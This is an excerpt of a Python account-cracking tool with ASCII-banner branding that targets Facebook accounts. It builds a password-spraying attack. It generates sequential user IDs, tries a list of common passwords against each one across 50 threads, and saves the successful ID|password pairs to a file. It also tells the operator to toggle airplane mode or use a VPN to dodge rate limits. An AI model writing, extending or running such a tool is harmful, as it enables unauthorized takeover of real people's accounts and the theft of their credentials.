...
{G} ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       
{purple}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}[{white}●{R}]{G} DEVELOPER    {white}➤{G} REZAUL ISLAM
{R}[{white}●{R}]{G} FACEBOOK     {white}➤{G} Anonymous GreyHat Hacker
{R}[{white}●{R}]{G} GITHUB   {white}    ➤{G} greyhat3671
{R}[{white}●{R}]{G} VERSION {white}     ➤{G} 1. 1
{purple}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""") 
def line():
        print(f'{purple}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{XX}')
        #_________[ LOGIN KEY ]______{A}➤ {G}
CorrectUsername = 'REZAUL' 
key = 'true'
while key == 'true':
...
class OLD_CLONER:
    ...
    def main(self):
        self.banner()
        print(f'\x1b[1;92m {XX}[{white}01{XX}]\x1b[38;5;46m CLONE {R}[{white}2009{R}]\x1b[38;5;46m SERIES')
        print(f'\x1b[1;92m {XX}[{white}02{XX}]\x1b[38;5;46m CLONE {R}[{white}2010{R}]\x1b[38;5;46m SERIES')
        print(f'\x1b[1;92m {XX}[{white}03{XX}]\x1b[38;5;46m CLONE {R}[{white}2008{R}]\x1b[38;5;46m SERIES')
        print(f'\x1b[1;92m {XX}[{white}04{XX}]\x1b[38;5;46m CLONE {R}[{white}2007{R}]\x1b[38;5;46m SERIES')
        print(f'\x1b[1;92m {XX}[{white}05{XX}]\x1b[38;5;46m CLONE {R}[{white}2006{R}]\x1b[38;5;46m SERIES')
        print(f'\x1b[1;92m {XX}[{white}06{XX}]\x1b[38;5;46m CLONE {R}[{white}2005{R}]\x1b[38;5;46m SERIES')
        print(f'\x1b[1;92m {XX}[{white}07{XX}]\x1b[38;5;46m CLONE {R}[{white}2013-14{R}]\x1b[38;5;46m SERIES')
        line()
    ...
    def oldClone(self,series):
        ...
        if series == "2009":
            ...
            self.uX = "100000"
            self.uG = 9
        print(f'\x1b[1;92m {XX}[{white}➤{XX}]\x1b[38;5;46m EXAMPLE : {G}2000  {G}3000  {G}4000 {G}5000');line()
        limit = int(input(f'\x1b[1;92m {XX}[{white}➤{XX}]\x1b[38;5;46m SELECT : '))
        ...
        with ThreadPoolExecutor(max_workers=50) as Mr_Code:
            self.banner()
            print(f"\x1b[1;92m{XX}[{white}➤{XX}]\x1b[38;5;46m TOTAL IDS {XX}:{G} "+str(len(self.gen)))
            print(f'\x1b[1;92m{XX}[{white}➤{XX}]\x1b[38;5;46m CRACK SERIES {XX}:{G} '+series)
            print(f'\x1b[1;92m{XX}[{white}➤{XX}]\x1b[38;5;46m USE VPN 1111 WHEN YOU RUN ')
            print(f'\x1b[1;92m{XX}[{white}➤{XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE \x1b[1;92m{XX}[\x1b[1;92mOLD CLONING{XX}]')
            line()
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "123123"," 111111", "000000","112233", "1234567890", "password", "@@@###"]
                Mr_Code.submit(self.CloneOld,ids,passlist)
        sys.exit("\n-------------------------------")
    
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r{red}[{white}➤{red}]{XX}[{green}REZAUL-RA{XX}]{G} - {self.loop} - {XX}[{G}OK{G} - {len(self.oks)}{XX}]")
        sys.stdout.flush()
        ...
        try:
            for pas in passlist:
                ...
                if "access_token" in response:
                    print(f"\r\r{red}[{white}➤{red}]{XX}[{G}MR-ASRAFUL-OK{XX}]{G}  {ids} | {pas}")
                    open("/sdcard/REZAUL -TOOLS/REZAUL -OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r{red}[{white}➤{red}]{XX}[{G}REZAUL-RA-OK{XX}]{G}  {ids} | {pas}")
                    open("/sdcard/REZAUL-TOOLS/REZAUL-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                else:continue
